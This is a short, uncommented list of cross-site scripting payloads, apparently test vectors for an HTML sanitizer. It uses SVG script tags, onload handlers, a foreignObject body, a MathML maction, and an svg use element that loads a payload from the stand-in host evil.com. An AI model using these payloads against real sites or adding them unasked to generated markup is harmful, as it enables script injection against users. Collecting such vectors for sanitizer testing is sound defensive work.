<svg><script>alert('xss')</script></svg>

<svg onload="alert('xss')">

<svg><use href="https://evil.com/evil.svg#payload"/>

<svg><foreignObject><body onload="alert('xss')"></foreignObject></svg>

<math><maction actiontype="statusline#http://evil.com">click</maction></math>
